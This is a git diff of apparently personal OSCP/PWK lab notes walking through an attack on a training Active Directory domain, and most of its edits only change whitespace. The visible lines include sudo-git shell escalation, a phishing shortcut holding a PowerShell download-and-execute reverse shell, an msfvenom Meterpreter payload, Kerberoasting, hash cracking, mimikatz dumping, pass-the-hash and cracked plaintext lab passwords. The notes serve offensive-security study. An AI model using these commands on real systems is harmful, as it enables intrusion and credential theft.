@@ -2691,10 +2691,12 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     Analyzing Github Files: /srv/www/wordpress/.git
     ```
   - Potential privilege escalation vectors: abuse sudo command /usr/bin/git, search Git repository, access WordPress database password   
-  - GTFOBins `sudo PAGER='sh -c "exec sh 0<&1"' git -p help`  
-    `daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help`
-  - GTFOBins `sudo git -p help config !/bin/sh`  
-    `daniela@websrv1:~$ sudo git -p help config` `!/bin/bash`
+  - GTFOBins  
+    `sudo PAGER='sh -c "exec sh 0<&1"' git -p help`    
+    `daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help`  
+  - GTFOBins 
+    `sudo git -p help config !/bin/sh`  
+    `daniela@websrv1:~$ sudo git -p help config` `!/bin/bash`  
   - **successfully elevated** our privileges on WEBSRV1  
   - Examing the Git repository  
 	```
@@ -2716,22 +2718,22 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     DanielKeyboard3311
     dqsTwTpZPn#nL
     ```
-  - Crack domain credentials agains SMB on MAILSRV1
+  - Crack domain credentials agains SMB on MAILSRV1  
     `kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success` #john:dqsTwTpZPn#nL
-  - no services such as WinRM or RDP, john is not a local admin (No Pwn3d!)  
-  - List the SMB shares
+  - no services such as WinRM or RDP, john is not a local admin (No Pwn3d!)   
+  - List the SMB shares  
     `kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares` #no actionble permission
-  - Phishing for access
+  - Phishing for access  
     - connect to **WINPREP** via RDP as offsec with a password of lab in order to prepare the Windows Library and shortcut files
     - File transfer server setup & map kali network drive
       ```
       kali@kali:~$ mkdir /home/kali/beyond/webdav
       kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
       ```
-    - create **config.Library-ms** (change url to kali ip)
-    - create **shortcut-automatic_configuration.lnk**
+    - create **config.Library-ms** (change url to kali ip)  
+    - create **shortcut-automatic_configuration.lnk**  
       `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<kali>:8000/powercat.ps1'); powercat -c <kali> -p 4444 -e powershell"`
-    - transfer 2 files to kali
+    - transfer 2 files to kali  
     - start powercat listener port 8000 and reverse shell port 4444
       ```
       kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
@@ -2782,57 +2784,19 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     - users
       `MATCH (m:User) RETURN m`
   - Enumerating services and sessions
-    - Bloodhount useful query
+    - Bloodhound useful query
       ```
       #Find all Kerberoastable Accounts
-      MATCH (u:User {hasspn:true}) RETURN u
-
       #Find all AS-REP Roastable Accounts
-      MATCH (u:User {dontreqpreauth:true}) RETURN u
-
       #Find Users with Default Passwords (rare but checks pwdneverexpires)
-      MATCH (u:User {passwordnotreqd:true}) RETURN u
-
       #Find all Domain Admins
-      MATCH (n:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN n
-
       #Find Computers where Domain Users are Local Admin
-      MATCH (g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[:AdminTo]->(c:Computer) RETURN g,c
-
-      #Find Workstations where Domain Users can RDP
-      MATCH (g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[:CanRDP]->(c:Computer) RETURN g,c
-
-      #Find Servers where Domain Users can RDP
-      MATCH (g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[:CanRDP]->(c:Computer) RETURN g,c
-
-      #Find Computers where High Value Users are Local Admin
-      MATCH (u:User {highvalue:true})-[:AdminTo]->(c:Computer) RETURN u,c
-
-      #Find All Domain Admin Sessions
-      MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}), (c:Computer)-[:HasSession]->(u) RETURN c,u
-
-      #Find Computers with Active Sessions
-	  MATCH (c:Computer)-[:HasSession]->(u:User) RETURN c,u
-
       #Shortest Paths to Domain Admins
-      MATCH (n:User),(m:Group {name:'DOMAIN ADMINS@<DOMAIN>'}),
-	  p=shortestPath((n)-[r*1..]->(m))
-	  RETURN p
-
-      #Shortest Paths to High Value Targets
-      MATCH (n:User),(m:Group {highvalue:true}),
-      p=shortestPath((n)-[r*1..]->(m))
-      RETURN p
-
-      #All Domain Admins from Owned Principals
-      MATCH (n {owned:true}),(m:Group {name:'DOMAIN ADMINS@<DOMAIN>'}),
-      p=shortestPath((n)-[r*1..]->(m))
-      RETURN p
       ```
-    - List all Kerberoastable Accounts pre-built query in BloodHound
+    - List all Kerberoastable Accounts pre-built query in BloodHound  
       `MATCH (n:User {hasspn:true}) RETURN n` #daniela, krbtgt
-    - List domain admins members: beccy, administrator
-  - Creating a Meterpreter reverse shell executable file
+    - List domain admins members: beccy, administrator  
+  - Creating a Meterpreter reverse shell executable file  
     `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.189 LPORT=443 -f exe -o met.exe`
   - Starting Metasploit listener on port 443
     ```
@@ -2862,7 +2826,7 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
   - proxychains configuration file settings (socks5 127.0.0.1 1080)
   - Enumerating SMB with CrackMapExec and proxychains  
     `kali@kali:~/beyond$ proxychains -q crackmapexec smb 172.16.134.240-241 172.16.134.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares`
-  - Using Nmap to perform a port scan on ports 21, 80, and 443
+  - Using Nmap to perform a port scan on ports 21, 80, and 443  
     `kali@kali:~/beyond$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.134.240 172.16.134.241 172.16.134.254`
   - Setting up Chisel on Kali to access the Web Server on INTERNALSRV1 via Browser
     `kali@kali:~/beyond$ ./chisel server -p 8080 --reverse`  
@@ -2876,9 +2840,9 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
   - Browse localhost but failed redirect > edit etc/hosts (127.0.0.1 internalsrv1.beyond.com)
   - open /wp-admin  
 - Attack an internal **web application**
-  - Kerberoasting the daniela user account
+  - Kerberoasting the daniela user account  
     `kali@kali:~/beyond$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.134.240 beyond.com/john`  
-  - Cracking the TGS-REP hash
+  - Cracking the TGS-REP hash  
     `kali@kali:~/beyond$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force`  
   - Abuse a WordPress Plugin for a Relay Attack  
    - Setting up impacket-ntlmrelayx
@@ -2918,7 +2882,7 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     mimikatz # privilege::debug
 	mimikatz # sekurlsa::logonpasswords  #f0397ec5af49971f6efbdb07877046b3
     ```
-  - Using psexec to get an interactive shell
+  - Using psexec to get an interactive shell  
     `kali@kali:~$ proxychains -q impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.134.240`  
 
 ## PWK-200 labs
